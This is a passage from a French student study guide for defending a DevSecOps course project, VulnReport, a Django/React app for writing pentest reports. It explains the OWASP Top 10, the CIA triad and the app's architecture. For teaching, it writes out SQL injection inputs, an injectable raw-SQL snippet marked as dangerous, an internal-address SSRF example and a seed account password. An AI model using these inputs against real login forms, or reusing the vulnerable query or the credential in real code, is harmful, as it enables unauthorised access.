# CONNAISSANCE COMPLETE DU PROJET VULNREPORT

## Guide de preparation a la soutenance

**Etudiant** : Antoine C. (Responsable Securite / DevOps)
**Module** : UE7 DevSecOps -- Guardia Cybersecurity School (B2/GCS2)
**Periode** : 23 mars -- 10 avril 2026
**Document** : Base de connaissance exhaustive pour la defense orale

---

## TABLE DES MATIERES

1. [SECTION 1 : LE CONTEXTE](#section-1--le-contexte)
2. [SECTION 2 : LE PROJET VULNREPORT](#section-2--le-projet-vulnreport)
3. [SECTION 3 : L'ARCHITECTURE TECHNIQUE](#section-3--larchitecture-technique)
4. [SECTION 4 : LA SECURITE EN DETAIL](#section-4--la-securite-en-detail)
5. [SECTION 5 : LE PIPELINE CI/CD](#section-5--le-pipeline-cicd)
6. [SECTION 6 : GIT ET GITLAB](#section-6--git-et-gitlab)
7. [SECTION 7 : LES ATELIERS PRATIQUES](#section-7--les-ateliers-pratiques)
8. [SECTION 8 : CE QU'IL RESTE A FAIRE](#section-8--ce-quil-reste-a-faire)
9. [SECTION 9 : GLOSSAIRE](#section-9--glossaire)

---

# SECTION 1 : LE CONTEXTE

Cette section explique pourquoi le projet VulnReport existe. Avant de parler du projet lui-meme, il faut comprendre le monde dans lequel il s'inscrit : celui de la securite informatique et du developpement logiciel.

---

## 1.1 Qu'est-ce que le DevSecOps ?

### Le developpement logiciel classique (SDLC)

Quand on cree un logiciel, on suit generalement un cycle de vie appele **SDLC** (Software Development Life Cycle, ou Cycle de Vie du Developpement Logiciel). C'est comme une recette de cuisine en plusieurs etapes :

1. **Planification** : On decide ce qu'on va construire (comme choisir la recette).
2. **Conception** : On dessine l'architecture du logiciel (comme preparer les ingredients).
3. **Developpement** : On ecrit le code (comme cuisiner le plat).
4. **Tests** : On verifie que ca marche (comme gouter le plat).
5. **Deploiement** : On met le logiciel a disposition des utilisateurs (comme servir le plat).
6. **Maintenance** : On corrige les bugs et on ameliore (comme ajuster la recette pour la prochaine fois).

Le probleme avec cette approche classique, c'est que la **securite** n'apparait nulle part dans ces etapes. Traditionnellement, on developpait le logiciel, puis on faisait un audit de securite a la fin. C'est comme construire une maison entiere, puis se rendre compte qu'on a oublie les serrures sur les portes. C'est tres couteux a corriger apres coup.

### Le Secure SDLC (SSDLC)

Le **SSDLC** (Secure Software Development Life Cycle) est l'evolution du SDLC classique. L'idee est simple : **integrer la securite a chaque etape du cycle**, pas seulement a la fin.

```
SDLC classique :
  Plan --> Conception --> Dev --> Test --> Deploy --> (Oh non, il y a des failles !)

SSDLC (Secure SDLC) :
  Plan + Securite --> Conception + Securite --> Dev + Securite --> Test + Securite --> Deploy + Securite
```

Concretement, dans un SSDLC :
- A la **planification**, on identifie les risques de securite.
- A la **conception**, on choisit des architectures securisees (par exemple, on decide de chiffrer les mots de passe).
- Au **developpement**, on ecrit du code qui se protege contre les attaques (par exemple, on utilise un ORM pour eviter les injections SQL).
- Aux **tests**, on fait des analyses de securite automatisees (SAST, SCA, DAST -- on expliquera ces termes plus loin).
- Au **deploiement**, on configure le serveur de maniere securisee (headers HTTP, HTTPS, etc.).

### La difference entre Dev, Sec et Ops

Le terme "DevSecOps" est la combinaison de trois mots :

- **Dev** (Developpement) : les personnes qui ecrivent le code de l'application. Ce sont les constructeurs.
- **Sec** (Securite) : les personnes qui s'assurent que l'application est protegee contre les attaques. Ce sont les gardiens.
- **Ops** (Operations) : les personnes qui deploient et maintiennent l'application en production. Ce sont les gestionnaires d'infrastructure.

**Analogie** : Imaginons la construction d'un immeuble.
- Les **Dev** sont les architectes et les macon -- ils construisent le batiment.
- Les **Sec** sont les experts en securite incendie et anti-intrusion -- ils s'assurent que le batiment est sur.
- Les **Ops** sont les gestionnaires de l'immeuble -- ils s'assurent que l'electricite fonctionne, que le chauffage marche, que tout est operationnel.

Historiquement, ces trois equipes travaillaient separement, ce qui creait des conflits :
- Les Dev voulaient livrer vite.
- Les Sec voulaient tout verifier (ce qui ralentit).
- Les Ops voulaient de la stabilite (pas de changements trop frequents).

Le **DevSecOps** fusionne ces trois disciplines pour que tout le monde travaille ensemble, avec la securite integree dans le processus de developpement et de deploiement, de maniere automatisee.

### Le concept de "Shift-Left"

"Shift-Left" signifie litteralement "decaler vers la gauche". Si on imagine le cycle de developpement comme une ligne horizontale allant de gauche (debut) a droite (fin) :

```
Planification --> Conception --> Developpement --> Tests --> Deploiement --> Production
     GAUCHE                                                                  DROITE
```

Traditionnellement, la securite etait a droite (en fin de cycle). Le "Shift-Left" consiste a deplacer la securite vers la gauche, c'est-a-dire le plus tot possible dans le cycle.

**Pourquoi c'est important ?** Parce que le cout de correction d'un bug augmente de maniere exponentielle avec le temps :

```
Phase ou le bug est trouve :        Cout relatif de correction :
Planification                       1x
Conception                          5x
Developpement                       10x
Tests                               20x
Production                          100x
Apres un incident de securite       1000x (+ reputation, amendes, etc.)
```

Un bug de securite trouve pendant la conception coute 5 fois plus a corriger que s'il avait ete identifie a la planification. En production, c'est 100 fois plus cher. Et si un pirate exploite la faille avant qu'on la trouve, les couts explosent (amendes RGPD, perte de reputation, frais juridiques, etc.).

**Analogie** : C'est comme une erreur dans les fondations d'une maison. Si on s'en rend compte avant de couler le beton, il suffit de refaire les plans. Si on s'en rend compte quand la maison est terminee, il faut tout demollir et recommencer.

---

## 1.2 Qu'est-ce qu'un pentest ?

Un **pentest** (abrege de "penetration test", ou test d'intrusion en francais) est un exercice de securite ou un expert simule une attaque informatique contre un systeme pour en trouver les failles.

**Analogie** : Imaginons que vous etes le proprietaire d'un musee. Vous engagez un ancien cambrioleur professionnel et vous lui dites : "Essaie de voler un tableau sans te faire prendre. Si tu y arrives, dis-moi comment tu as fait pour que je puisse ameliorer ma securite." C'est exactement ce que fait un pentester, mais avec des systemes informatiques.

### Le processus d'un pentest

1. **Cadrage** : Le client definit le perimetre (quels systemes tester, quelles limites).
2. **Reconnaissance** : Le pentester collecte des informations sur la cible (comme un cambrioleur qui etudie les lieux).
3. **Scan et enumeration** : Le pentester identifie les services actifs, les ports ouverts, les technologies utilisees.
4. **Exploitation** : Le pentester tente d'exploiter les failles trouvees.
5. **Post-exploitation** : Le pentester mesure l'impact (jusqu'ou il peut aller une fois dans le systeme).
6. **Rapport** : Le pentester redige un rapport detaille avec les failles trouvees, leur impact et les recommandations.

### Pourquoi a-t-on besoin de rapports de pentest ?

Le rapport de pentest est le **livrable principal** d'un test d'intrusion. C'est le document que le client recoit et qui contient :

- La liste des vulnerabilites trouvees (appelees "findings").
- Pour chaque finding : la description, la preuve d'exploitation (PoC), l'impact, la severite, et la recommandation de correction.
- Un resume executif pour les decideurs non techniques.

Ce rapport est **extremement sensible**. Il contient literalement la liste de toutes les failles du systeme du client. Si ce document tombe entre de mauvaises mains, un attaquant aurait une feuille de route pour pirater le systeme.

C'est pourquoi l'application **VulnReport** existe : pour permettre aux pentesters de generer ces rapports de maniere securisee, structuree et professionnelle.

---

## 1.3 Qu'est-ce que l'OWASP Top 10 ?

L'**OWASP** (Open Web Application Security Project) est une fondation a but non lucratif qui travaille a ameliorer la securite des logiciels. C'est comme une encyclopedie collaborative de la securite informatique.

Le **OWASP Top 10** est un document publie tous les 3-4 ans qui liste les **10 risques de securite les plus critiques** pour les applications web. C'est le standard de reference dans l'industrie. Tout developpeur web devrait connaitre cette liste.

Voici le Top 10 de 2021 (version la plus recente) avec des explications simples :

### A01:2021 -- Broken Access Control (Controle d'acces defaillant)

**Explication simple** : L'application ne verifie pas correctement si un utilisateur a le droit de faire ce qu'il essaie de faire.

**Analogie** : Imaginons un hotel ou chaque client recoit une carte pour sa chambre. Un "Broken Access Control", c'est quand la carte de la chambre 101 ouvre aussi la chambre 102. Le client peut acceder a une chambre qui n'est pas la sienne.

**Exemple concret** : Un utilisateur normal modifie l'URL de `monsite.com/profil/123` (son profil) a `monsite.com/profil/456` (le profil d'un autre) et peut voir les informations d'une autre personne.

**Dans VulnReport** : On se protege avec le RBAC (controle d'acces base sur les roles) et la verification d'ownership cote serveur. Un pentester ne peut voir que SES rapports, jamais ceux des autres.

### A02:2021 -- Cryptographic Failures (Defaillances cryptographiques)

**Explication simple** : Les donnees sensibles ne sont pas protegees correctement (pas de chiffrement, ou chiffrement trop faible).

**Analogie** : C'est comme ecrire son mot de passe sur un post-it colle sur son ecran. N'importe qui passant par la peut le lire.

**Exemple concret** : Un site web stocke les mots de passe en clair dans sa base de donnees. Si la base est piratee, tous les mots de passe sont directement lisibles.

**Dans VulnReport** : Les mots de passe sont haches avec Argon2id (l'algorithme le plus robuste actuellement). Les secrets (cles, mots de passe de base de donnees) sont stockes dans des variables d'environnement, jamais dans le code source.

### A03:2021 -- Injection

**Explication simple** : Un attaquant envoie des donnees malveillantes qui sont interpretees comme des commandes par l'application.

**Analogie** : Imaginons un formulaire papier ou on vous demande votre nom. Au lieu d'ecrire "Jean", quelqu'un ecrit "Jean ; et supprime tous les dossiers". Si le systeme execute cette instruction sans la verifier, c'est une injection.

**Exemple concret (Injection SQL)** : Dans un champ de connexion, au lieu de taper son mot de passe, un attaquant tape : `' OR 1=1 --`. Si l'application ne se protege pas, cette commande modifie la requete SQL et permet de se connecter sans mot de passe valide.

**Dans VulnReport** : On utilise l'ORM Django qui genere automatiquement des requetes parametrees. Cela signifie que les donnees utilisateur sont toujours traitees comme des DONNEES, jamais comme des COMMANDES. Aucune requete SQL brute n'est utilisee dans le code.

### A04:2021 -- Insecure Design (Conception non securisee)

**Explication simple** : L'application a ete concue sans penser a la securite des le depart.

**Analogie** : C'est comme construire une banque sans coffre-fort. Meme si les murs sont solides, il manque un element fondamental de securite dans la conception.

**Exemple concret** : Un systeme de recuperation de mot de passe qui pose la question "Quel est le nom de votre animal de compagnie ?" -- une information facilement trouvable sur les reseaux sociaux.

**Dans VulnReport** : On applique le principe de "Security by Design" -- la securite est pensee des la phase de conception. Par exemple, on a decide des le depart que les rapports auraient un proprietaire et que seul le proprietaire ou un admin pourrait les modifier.

### A05:2021 -- Security Misconfiguration (Mauvaise configuration de securite)

**Explication simple** : Le logiciel est correctement code mais mal configure, ce qui cree des failles.

**Analogie** : C'est comme avoir une porte blindee mais laisser la cle sous le paillasson.

**Exemple concret** : Laisser le mode "debug" active en production (ce qui affiche les erreurs detaillees, y compris le code source et les mots de passe de base de donnees, a n'importe quel visiteur).

**Dans VulnReport** : On a configure Django avec `DEBUG=False` en production, on a renomme le chemin d'administration (`/gestion-securisee/` au lieu de `/admin/`), on a ajoute tous les headers de securite HTTP, et on a desactive l'affichage de la version de Nginx.

### A06:2021 -- Vulnerable and Outdated Components (Composants vulnerables et obsoletes)

**Explication simple** : L'application utilise des bibliotheques tierces (dependances) qui contiennent des failles connues.

**Analogie** : C'est comme construire une maison avec des materiaux de construction defectueux rappeles par le fabricant. Meme si votre travail de construction est parfait, les materiaux eux-memes sont dangereux.

**Exemple concret** : Une application qui utilise une vieille version de jQuery (3.2.1) qui contient des failles XSS connues et documentees publiquement.

**Dans VulnReport** : On epingle toutes les versions de nos dependances dans `requirements.txt` et `package.json`. On utilise Safety, Trivy et npm audit dans notre pipeline CI/CD pour detecter automatiquement les CVE connues dans nos dependances.

### A07:2021 -- Identification and Authentication Failures (Defaillances d'authentification)

**Explication simple** : Le systeme de connexion est faible et peut etre contourne.

**Analogie** : C'est comme un vigile de boite de nuit qui laisse entrer tout le monde sans verifier les cartes d'identite.

**Exemple concret** : Un site qui permet des tentatives de connexion illimitees (un attaquant peut essayer tous les mots de passe possibles -- attaque par "brute force").

**Dans VulnReport** : On a mis en place un rate limiting double couche (5 tentatives par minute au niveau Django, 10 requetes par seconde au niveau Nginx), une politique de mots de passe forts (12 caracteres minimum), et une anti-enumeration de comptes (le meme message d'erreur que l'utilisateur existe ou non).

### A08:2021 -- Software and Data Integrity Failures (Defaillances d'integrite des donnees)

**Explication simple** : L'application ne verifie pas que les donnees et le code n'ont pas ete modifies de maniere non autorisee.

**Analogie** : C'est comme recevoir un colis sans verifier que le scelle n'a pas ete brise. Quelqu'un a peut-etre ouvert le colis et modifie son contenu.

**Exemple concret** : Un pipeline CI/CD qui execute du code telecharge d'internet sans verifier sa signature. Un attaquant pourrait remplacer une dependance par une version malveillante.

**Dans VulnReport** : L'audit log est immutable (on ne peut ni modifier ni supprimer les entrees). TruffleHog verifie que le code ne contient pas de secrets. Les tokens CSRF protegent contre la falsification de requetes.

### A09:2021 -- Security Logging and Monitoring Failures (Defaillances de journalisation)

**Explication simple** : L'application ne garde pas de traces des evenements de securite, rendant impossible la detection et l'investigation des attaques.

**Analogie** : C'est comme un magasin sans cameras de surveillance. Si un vol se produit, on ne peut pas savoir qui l'a fait ni comment.

**Exemple concret** : Un systeme qui ne journalise pas les tentatives de connexion echouees. Un attaquant peut essayer des milliers de mots de passe sans qu'on s'en apercoive.

**Dans VulnReport** : On a un systeme d'audit complet qui trace 18 types d'actions differentes (connexion, deconnexion, creation/modification/suppression de rapports, etc.). Les logs sont immutables et accessibles uniquement aux administrateurs. Un fichier `security.log` dedié journalise les evenements de securite.

### A10:2021 -- Server-Side Request Forgery (SSRF)

**Explication simple** : L'attaquant fait en sorte que le serveur de l'application effectue des requetes vers des ressources internes qu'il ne devrait pas pouvoir atteindre.

**Analogie** : C'est comme si un visiteur d'une entreprise demandait a la receptionniste d'appeler un numero interne confidentiel. La receptionniste a acces au telephone interne, mais elle ne devrait pas passer des appels pour des visiteurs non autorises.

**Exemple concret** : Une application qui permet de "pre-visualiser" une URL. L'attaquant saisit `http://192.168.1.1/admin` (une adresse interne) et le serveur, qui a acces au reseau interne, recupere la page d'administration.

**Dans VulnReport** : L'application ne contient aucune fonctionnalite qui accepte une URL et effectue des requetes sortantes. Les champs URL dans le modele Resource sont stockes mais jamais appeles par le serveur.

---

## 1.4 Le triptyque CIA (Confidentialite, Integrite, Disponibilite)

Le **CIA triad** (triptyque CIA) est le modele fondamental de la securite de l'information. Chaque mesure de securite vise a proteger au moins un de ces trois piliers.

### Confidentialite (Confidentiality)

**Definition** : S'assurer que les informations ne sont accessibles qu'aux personnes autorisees.

**Analogie** : C'est comme une lettre dans une enveloppe scellee. Seul le destinataire peut l'ouvrir et la lire.

**Exemples concrets** :
- Le chiffrement des mots de passe (meme si la base est piratee, les mots de passe ne sont pas lisibles).
- Le RBAC : un Viewer ne peut pas lire les rapports non publies.
- Les cookies HttpOnly : le JavaScript ne peut pas acceder au cookie de session.

**Dans VulnReport** : Les rapports de pentest contiennent des informations tres sensibles (les failles des systemes des clients). La confidentialite est assuree par le RBAC, l'ownership des rapports, le hachage des mots de passe, et les sessions securisees.

### Integrite (Integrity)

**Definition** : S'assurer que les informations ne sont pas modifiees de maniere non autorisee.

**Analogie** : C'est comme un contrat notarie. On peut verifier que le document n'a pas ete altere depuis sa signature.

**Exemples concrets** :
- L'ORM Django empeche les injections SQL (un attaquant ne peut pas modifier les donnees de la base).
- L'audit log immutable garantit que les traces ne peuvent pas etre alterees.
- Les tokens CSRF empechent un site malveillant de soumettre des formulaires en votre nom.

**Dans VulnReport** : L'integrite est assuree par l'ORM parametrise, la validation des entrees, l'audit log immutable, et la verification d'ownership cote serveur.

### Disponibilite (Availability)

**Definition** : S'assurer que les systemes et les donnees sont accessibles quand on en a besoin.

**Analogie** : C'est comme un distributeur automatique. Meme s'il est bien protege (blindage, camera), s'il est toujours en panne, il ne sert a rien.

**Exemples concrets** :
- Le rate limiting empeche un attaquant de surcharger le serveur (attaque DoS).
- Le restart automatique des conteneurs Docker (`restart: unless-stopped`).
- Le healthcheck de PostgreSQL verifie que la base de donnees est accessible.

**Dans VulnReport** : La disponibilite est assuree par le rate limiting (contre les attaques DoS), les conteneurs Docker avec restart automatique, les healthchecks, et les conteneurs en `read_only` (pour eviter l'epuisement du disque).

```
          CONFIDENTIALITE
              /\
             /  \
            /    \
           / CIA  \
          /  TRIAD \
         /          \
        /____________\
  INTEGRITE      DISPONIBILITE
```

Chaque mesure de securite dans VulnReport protege un ou plusieurs de ces trois axes. Par exemple :
- Le hachage Argon2id protege la **confidentialite** (mots de passe illisibles).
- L'ORM Django protege l'**integrite** (pas de modification non autorisee de la base).
- Le rate limiting protege la **disponibilite** (le serveur reste accessible).

---

# SECTION 2 : LE PROJET VULNREPORT

## 2.1 Vision : qu'est-ce que VulnReport et a quoi ca sert

VulnReport est une **application web securisee** destinee aux equipes de pentest (tests d'intrusion). Elle a deux objectifs principaux :

### Pilier 1 : Generation de rapports de pentest

L'application permet aux pentesters de creer, editer et publier des rapports de tests d'intrusion de maniere structuree et professionnelle. Un rapport contient :

- Un **titre** et un **contexte** (description du systeme teste, des objectifs du test).
- Un **resume executif** (synthese pour les decideurs non techniques).
- Des **findings** (vulnerabilites trouvees), chacun avec :
  - Une description detaillee de la faille.
  - Une preuve d'exploitation (PoC -- Proof of Concept).
  - L'impact de la faille (que peut faire un attaquant).
  - La recommandation de correction.
  - La severite (Low, Medium, High, Critical).
  - Un score CVSS (systeme de notation standardise des vulnerabilites).
- Un **statut** qui evolue : Brouillon -> En cours -> Finalise -> Publie.

### Pilier 2 : Base de Connaissance (Knowledge Base, KB)

La KB est une bibliotheque de fiches sur les vulnerabilites connues. Elle contient des fiches pre-remplies sur les vulnerabilites classiques (injection SQL, XSS, CSRF, etc.) avec :

- Le nom de la vulnerabilite.
- Sa description.
- La recommandation de correction.
- Les references (OWASP, CWE, CVE).
- La severite par defaut.
- La categorie (Injection, Auth, XSS, etc.).

L'interet de la KB est de permettre aux pentesters de creer des findings **rapidement** en s'appuyant sur des fiches pre-remplies. Quand un pentester trouve une injection SQL, au lieu de tout rediger depuis zero, il selectionne la fiche "SQL Injection" dans la KB et les champs sont automatiquement pre-remplis. Il n'a plus qu'a adapter les details a son cas specifique.

**15 fiches sont pre-chargees**, couvrant les vulnerabilites classiques : SQL Injection, XSS (Reflected + Stored), IDOR, Privilege Escalation, CSRF, SSRF, Security Misconfiguration, Sensitive Data Exposure, Broken Auth, XXE, Insecure Deserialization, Supply Chain, Logging & Monitoring, Path Traversal.

---

## 2.2 L'equipe : qui fait quoi

L'equipe est composee de 4 membres avec des responsabilites complementaires :

| Membre | Role | Responsabilites |
|--------|------|-----------------|
| **Noa B.** | Chef de Projet | Coordination de l'equipe, gestion du board GitLab (issues, sprints), suivi des jalons, redaction des livrables documentaires, point de contact pedagogique. |
| **Diego D.** | Responsable Frontend | Interfaces utilisateur React, integration avec le backend, UX des workflows Pentester/Admin/Viewer, validation cote client. |
| **Raphael L.** | Responsable Backend | Logique serveur Django, authentification, sessions, RBAC, modules Rapports/KB/Audit log, conception et migrations de la base de donnees. |
| **Antoine C.** | Responsable Securite/DevOps | Pipeline CI/CD GitLab, Docker, integration SAST/SCA/DAST, headers de securite HTTP, CSP, protection anti-XSS/SQLi, rapport de securite final. |

**Important** : Chaque membre contribue au code au-dela de son domaine principal. La specialisation definit la **responsabilite** de chaque perimetre, pas une frontiere rigide. Par exemple, Antoine (Securite/DevOps) peut aussi contribuer au code backend quand il ajoute des headers de securite.

---

## 2.3 Le planning : 3 sprints, dates, jalons

Le projet s'etale sur 18 jours calendaires (23 mars -- 10 avril 2026) et est organise en 3 sprints d'une semaine chacun, inspires de la methode agile.

**Qu'est-ce qu'un sprint ?** C'est une periode de temps fixe (ici, une semaine) pendant laquelle l'equipe s'engage a realiser un ensemble de taches definies a l'avance.

### Sprint 1 -- Fondations (23/03 -> 29/03)

**Objectif** : Construire les bases solides de l'application.

Taches realisees :
- Initialisation du depot GitLab (structure, branches, board Kanban).
- Creation du Dockerfile de base et du docker-compose (4 conteneurs).
- Structure de la base de donnees (6 tables, migrations Django).
- Authentification securisee (hashage Argon2id, cookies HttpOnly/Secure/SameSite, headers HTTP).
- RBAC strict (Viewer, Pentester, Admin) avec classes de permissions DRF.
- Fondations Security by Design (ORM parametrise, validation des entrees).
- Pipeline CI/CD initial (lint, SAST, SCA).

**Jalon J1** (29 mars) : Depot GitLab initialise, Dockerfile fonctionnel, authentification + RBAC codes.

### Sprint 2 -- Coeur Fonctionnel (30/03 -> 05/04)

**Objectif** : Construire les fonctionnalites metier de l'application.

Taches realisees :
- Module Base de Connaissance (KB) -- CRUD Admin, 15 fiches pre-chargees.
- Module Rapports -- creation, ajout de findings (depuis KB ou custom), gestion des statuts.
- Module Findings -- pre-remplissage depuis KB, PoC, impact, recommandation, severite, CVSS.
- Audit log complet (18 types d'actions, immutabilite, acces admin uniquement).
- Validation rigoureuse des entrees (anti-SQLi, anti-XSS) via serializers DRF.
- Dashboard (compteurs : nombre de rapports, findings par severite, activite recente).
- 86 tests backend (25 accounts, 27 reports, 18 KB, 16 audit).
- Frontend React complet (9 pages, theme dark cybersecurite).

**Jalon J2** (5 avril) : Modules Rapports, KB et Audit log fonctionnels. Protections SQLi/XSS actives.

### Sprint 3 -- Pipeline et Finalisation (06/04 -> 10/04)

**Objectif** : Finaliser le pipeline CI/CD et la documentation.

Taches realisees :
- Configuration du pipeline CI/CD GitLab complet (7 stages).
- Integration SAST (Bandit, Semgrep), SCA (Safety, Trivy, npm audit), detection de secrets (TruffleHog), DAST (OWASP ZAP).
- Feature freeze le 08/04 : correction des vulnerabilites detectees.
- Audit de securite : 79 issues trouvees et corrigees.
- Rapport de securite final (10 pages).
- README final (variables d'env, comptes seed, commandes Docker).
- Hardening : conteneurs read_only, utilisateur non-root, tmpfs.

**Jalon J3** (8 avril) : Feature freeze. Pipeline CI/CD actif. Artefacts SAST/SCA/DAST generes.
**Jalon J4** (10 avril) : README, Rapport de securite, application dockerisee testable.

---

## 2.4 Ce qui a ete fait (recapitulatif)

| Element | Statut | Detail |
|---------|--------|--------|
| Sprint 1 -- Fondations | Fait | Auth, RBAC, Docker, pipeline CI/CD initial |
| Sprint 2 -- Coeur Fonctionnel | Fait | KB, Rapports, Findings, Audit, Dashboard, 86 tests |
| Sprint 3 -- Finalisation | Fait | Rapport securite, hardening, artefacts CI/CD complets |
| Atelier 1 -- Presentation | Fait | Plan de dev, DAT, Analyse des risques |
| Atelier 2 -- CI/CD + SCA | Fait | Pipeline, OWASP Dep-Check, Snyk, questions theoriques |
| Atelier 3 -- SAST+DAST+Secrets | Fait | Bandit, ZAP, TruffleHog, patch management |
| Audit securite | Fait | 79 issues trouvees et corrigees |
| Tests | Fait | 86 tests backend (auth, RBAC, ownership, findings, KB, audit) |

L'application represente environ **84 fichiers** et **12 000 lignes de code**.

---

# SECTION 3 : L'ARCHITECTURE TECHNIQUE

Cette section explique comment VulnReport est construit, en partant des concepts les plus basiques.

---

## 3.1 Le concept client-serveur

### Qu'est-ce qu'un serveur web ?

Un **serveur** est un ordinateur qui attend des demandes (requetes) et envoie des reponses. C'est comme un serveur dans un restaurant : il attend que vous passiez commande, puis il vous apporte votre plat.

Un **serveur web** est un serveur specialise dans le traitement des requetes HTTP (le protocole du web). Quand vous tapez une adresse dans votre navigateur, votre navigateur envoie une requete HTTP au serveur web, qui repond avec une page HTML, des images, etc.

### Qu'est-ce qu'un client ?

Le **client** est le programme qui envoie les requetes au serveur. Dans le cas du web, le client est votre **navigateur** (Chrome, Firefox, etc.). C'est le client (le navigateur) qui affiche les pages web.

```
[Navigateur (Client)] ---requete HTTP---> [Serveur Web]
[Navigateur (Client)] <---reponse HTTP--- [Serveur Web]
```

### Qu'est-ce qu'une requete HTTP ?

**HTTP** (HyperText Transfer Protocol) est le langage que parlent les navigateurs et les serveurs pour communiquer. Une requete HTTP contient :

- Une **methode** : ce que le client veut faire.
  - `GET` : "Donne-moi cette page/ressource" (lire)
  - `POST` : "Voici des donnees, traite-les" (creer)
  - `PUT/PATCH` : "Modifie cette ressource" (mettre a jour)
  - `DELETE` : "Supprime cette ressource" (supprimer)
- Une **URL** : l'adresse de la ressource demandee (par exemple `/api/reports/5/`).
- Des **headers** : des informations supplementaires (cookies, type de contenu, etc.).
- Un **corps** (body) : les donnees envoyees (pour POST et PUT/PATCH).

**Exemple concret dans VulnReport** :

```
Requete : POST /api/auth/login/
Headers : Content-Type: application/json
Body    : {"username": "pentester1", "password": "Pentester@VulnReport2026!"}

Reponse : 200 OK
Headers : Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
Body    : {"user": {"id": 2, "username": "pentester1", "role": "pentester"}}
```

### Qu'est-ce qu'une API REST ?

Une **API** (Application Programming Interface) est un ensemble de regles qui permet a deux logiciels de communiquer entre eux. C'est comme un menu dans un restaurant : il definit ce que vous pouvez commander et comment le commander.

**REST** (Representational State Transfer) est un style d'architecture pour les API web. Une API REST suit ces principes :

1. **Ressources** : Chaque element est une ressource avec une URL unique (par exemple, `/api/reports/5/` est le rapport numero 5).
2. **Methodes HTTP** : Les operations utilisent les methodes HTTP standard (GET pour lire, POST pour creer, etc.).
3. **Stateless** : Chaque requete contient toutes les informations necessaires (le serveur ne "se souvient" pas des requetes precedentes -- sauf via les sessions).
4. **Format JSON** : Les donnees sont echangees au format JSON (JavaScript Object Notation), un format texte facile a lire et a traiter.

**Qu'est-ce que le JSON ?**

JSON est un format de donnees structure. C'est comme un formulaire rempli, mais en texte :

```json
{
  "titre": "Rapport Pentest Client X",
  "statut": "brouillon",
  "findings": [
    {
      "titre": "Injection SQL",
      "severite": "critical",
      "score_cvss": 9.8
    },
    {
      "titre": "XSS reflechi",
      "severite": "medium",
      "score_cvss": 6.1
    }
  ]
}
```

Dans VulnReport, le **frontend React** (client) communique avec le **backend Django** (serveur) via une API REST. Le frontend envoie des requetes HTTP et recoit des reponses en JSON.

### Qu'est-ce qu'une base de donnees relationnelle ?

Une **base de donnees** est un systeme organise pour stocker, modifier et recuperer des donnees. C'est comme un classeur avec des dossiers bien ranges.

Une base de donnees **relationnelle** organise les donnees dans des **tables** (comme des tableurs Excel). Chaque table a :

- Des **colonnes** (les champs) : par exemple, "nom", "email", "role".
- Des **lignes** (les enregistrements) : chaque ligne est une entite (par exemple, un utilisateur).
- Des **cles primaires** (Primary Key, PK) : un identifiant unique pour chaque ligne (generalement un numero auto-incremente).
- Des **cles etrangeres** (Foreign Key, FK) : un lien vers une ligne dans une autre table.

**Analogie** : Imaginons un annuaire telephonique (table "Contacts") et un carnet d'adresses (table "Adresses"). Chaque contact a un numero unique (cle primaire). Chaque adresse reference le numero du contact auquel elle appartient (cle etrangere). C'est une **relation** entre deux tables.

**Exemple dans VulnReport** :

```
Table User :
+----+----------+---------+
| id | username | role    |
+----+----------+---------+
| 1  | admin    | admin   |
| 2  | pentester1| pentester|
+----+----------+---------+

Table Report :
+----+-----------------+--------+----------+
| id | title           | status | owner_id |  <-- owner_id est une FK vers User.id
+----+-----------------+--------+----------+
| 1  | Rapport Client X| draft  | 2        |  <-- Ce rapport appartient a pentester1
+----+-----------------+--------+----------+

Table Finding :
+----+-----------------+-----------+-----------+
| id | title           | severity  | report_id |  <-- report_id est une FK vers Report.id
+----+-----------------+-----------+-----------+
| 1  | Injection SQL   | critical  | 1         |  <-- Ce finding appartient au Rapport 1
| 2  | XSS reflechi    | medium    | 1         |
+----+-----------------+-----------+-----------+
```

---

## 3.2 Le Backend (Django)

### Qu'est-ce que Python ?

**Python** est un langage de programmation tres populaire, connu pour sa lisibilite et sa simplicite. C'est le langage le plus utilise dans le monde de la cybersecurite et de la science des donnees. Python est aussi utilise pour le developpement web grace a des frameworks comme Django.

### Qu'est-ce que Django ?

**Django** est un framework web Python. Un framework, c'est comme une boite a outils deja organisee avec tout ce dont vous avez besoin pour construire quelque chose. Au lieu de tout fabriquer depuis zero, Django fournit des outils prets a l'emploi pour :

- Gerer les utilisateurs et l'authentification.
- Interagir avec la base de donnees (via l'ORM).
- Gerer les sessions et les cookies.
- Proteger contre les attaques CSRF.
- Echapper automatiquement les donnees dans les templates (anti-XSS).
- Gerer les migrations de base de donnees.
- Fournir une interface d'administration auto-generee.

**Pourquoi Django pour VulnReport ?**

1. **Securite native** : Django integre des protections de securite par defaut (CSRF, echappement, sessions securisees). Pour un projet axe sur la securite, c'est ideal.
2. **ORM integre** : L'ORM previent automatiquement les injections SQL.
3. **Systeme d'authentification complet** : Gestion des utilisateurs, hashage des mots de passe, sessions -- tout est pret.
4. **"Batteries included"** : Django fournit tout ce dont on a besoin sans installer des dizaines de bibliotheques tierces.
5. **Django REST Framework (DRF)** : Extension qui transforme Django en API REST avec serializers, permissions et pagination.

### Qu'est-ce qu'un ORM ?

**ORM** signifie Object-Relational Mapping (Mapping Objet-Relationnel). C'est un outil qui permet de manipuler la base de donnees en ecrivant du Python au lieu du SQL.

**Analogie** : Imaginons que vous parlez francais et que la base de donnees parle anglais. L'ORM est un interprete qui traduit vos instructions francaises en anglais pour la base de donnees, et traduit les reponses anglaises en francais pour vous.

**Sans ORM (SQL brut -- DANGEREUX)** :
```python
# DANGEREUX : Injection SQL possible !
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
```

Si un attaquant envoie `username = "admin' OR '1'='1"`, la requete devient :
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```
Cela retourne TOUS les utilisateurs -- c'est une injection SQL.

**Avec ORM Django (SUR)** :
```python
# SUR : L'ORM genere automatiquement une requete parametree
user = User.objects.filter(username=username).first()
```

L'ORM genere automatiquement :
```sql
SELECT * FROM users WHERE username = %s
-- Le %s est remplace de maniere securisee, impossible d'injecter du SQL
```

**Pourquoi c'est important pour la securite ?** L'ORM est la principale protection contre les injections SQL (A03 OWASP). En utilisant exclusivement l'ORM, on ne peut tout simplement PAS faire d'injection SQL. C'est une protection structurelle, pas un patch.

### Les 4 applications Django

Django organise le code en "apps" (applications), chacune responsable d'un domaine. VulnReport a 4 apps :

#### App `accounts` -- Authentification et RBAC

**Responsabilite** : Gerer les utilisateurs, la connexion, la deconnexion, les roles et les permissions.

**Fichiers cles** :
